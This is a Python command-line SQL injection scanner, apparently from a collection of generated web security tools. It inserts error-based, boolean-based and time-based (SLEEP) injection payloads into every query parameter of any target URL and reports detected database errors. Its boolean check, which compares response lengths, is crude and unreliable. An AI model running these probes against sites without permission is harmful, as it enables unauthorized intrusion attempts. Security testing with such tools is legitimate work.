# CATEGORY: Web
import argparse
import json
import sys
import time
import urllib.parse
import requests

TOOL_NAME = "SQLiScanner"
VERSION = "1.0.0"
SLEEP_INTERVAL = 0.5
TIME_DELAY = 5  # seconds for time-based detection

SQL_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "sql syntax error",
    "syntax error",
    "mysql_fetch",
    "ORA-01756",
    "Microsoft OLE DB Provider for ODBC Drivers",
    "ODBC Microsoft Access Driver",
]


def safe_request(url, params=None, timeout=10):
    """Perform a GET request with error handling and rate limiting."""
    try:
        response = requests.get(url, params=params, timeout=timeout)
        time.sleep(SLEEP_INTERVAL)
        return response
    except Exception as e:
        return e


def build_url(base, payload):
    """Inject payload into each query parameter of the URL."""
    parsed = urllib.parse.urlparse(base)
    query = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    if not query:
        # No existing params, add a dummy one
        query = {"id": [""]}

    injected = {}
    for key in query:
        injected[key] = [payload]
    new_query = urllib.parse.urlencode(injected, doseq=True)
    new_url = urllib.parse.urlunparse(
        (
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            new_query,
            parsed.fragment,
        )
    )
    return new_url


def error_based_detection(target):
    findings = []
    results = {}
    payloads = ["'", "\"", "`", " OR 1=1--", " OR '1'='1'--"]
    for payload in payloads:
        test_url = build_url(target, payload)
        resp = safe_request(test_url)
        if isinstance(resp, Exception):
            continue
        body = resp.text.lower()
        if any(err.lower() in body for err in SQL_ERRORS):
            findings.append(f"Error-based SQLi detected with payload {payload!r}")
            results[payload] = {"status_code": resp.status_code, "error_detected": True}
            break
        else:
            results[payload] = {"status_code": resp.status_code, "error_detected": False}
    return findings, results


def boolean_based_detection(target):
    findings = []
    results = {}
    true_payload = " AND 1=1--"
    false_payload = " AND 1=2--"

    true_url = build_url(target, true_payload)
    false_url = build_url(target, false_payload)

    true_resp = safe_request(true_url)
    false_resp = safe_request(false_url)

    if isinstance(true_resp, Exception) or isinstance(false_resp, Exception):
        return findings, results

    true_len = len(true_resp.text)
    false_len = len(false_resp.text)

    results["true_payload"] = {"status_code": true_resp.status_code, "length": true_len}
    results["false_payload"] = {"status_code": false_resp.status_code, "length": false_len}

    if true_len != false_len:
        findings.append("Boolean-based SQLi vulnerability detected (response size differs).")
    return findings, results


def time_based_detection(target):
    findings = []
    results = {}
    payload = f" AND IF(1=1,SLEEP({TIME_DELAY}),0)--"
    test_url = build_url(target, payload)

    start = time.time()
    resp = safe_request(test_url)
    elapsed = time.time() - start

    if isinstance(resp, Exception):
        return findings, results

    results["payload"] = payload
    results["elapsed_seconds"] = round(elapsed, 2)
    results["status_code"] = resp.status_code

    if elapsed > TIME_DELAY:
        findings.append("Time-based SQLi vulnerability detected (response delayed).")
    return findings, results


def run_all_checks(target):
    overall_findings = []
    overall_results = {}

    f, r = error_based_detection(target)
    overall_findings.extend(f)
    overall_results["error_based"] = r

    f, r = boolean_based_detection(target)
    overall_findings.extend(f)
    overall_results["boolean_based"] = r

    f, r = time_based_detection(target)
    overall_findings.extend(f)
    overall_results["time_based"] = r

    return overall_findings, overall_results


def self_test():
    """Simple self‑test using httpbin.org which should not be vulnerable."""
    test_url = "https://httpbin.org/get?test=1"
    findings, results = run_all_checks(test_url)

    # Expect no findings
    if findings:
        print(json.dumps({
            "tool": TOOL_NAME,
            "version": VERSION,
            "target": test_url,
            "status": "self-test-failed",
            "findings": findings,
            "results": results
        }, indent=2))
        sys.exit(1)
    else:
        print(json.dumps({
            "tool": TOOL_NAME,
            "version": VERSION,
            "target": test_url,
            "status": "self-test-passed",
            "findings": [],
            "results": results
        }, indent=2))
        sys.exit(0)


def main():
    parser = argparse.ArgumentParser(description="SQLi detection tool")
    parser.add_argument("target", nargs="?", help="Target URL to scan")
    parser.add_argument("--self-test", action="store_true", help="Run internal self‑test")
    args = parser.parse_args()

    if args.self_test:
        self_test()
        return

    if not args.target:
        print(json.dumps({
            "tool": TOOL_NAME,
            "version": VERSION,
            "target": None,
            "status": "error",
            "findings": ["No target URL provided."],
            "results": {}
        }, indent=2))
        sys.exit(1)

    findings, results = run_all_checks(args.target)

    output = {
        "tool": TOOL_NAME,
        "version": VERSION,
        "target": args.target,
        "status": "completed",
        "findings": findings,
        "results": results
    }

    print(json.dumps(output, indent=2))


if __name__ == "__main__":
    main()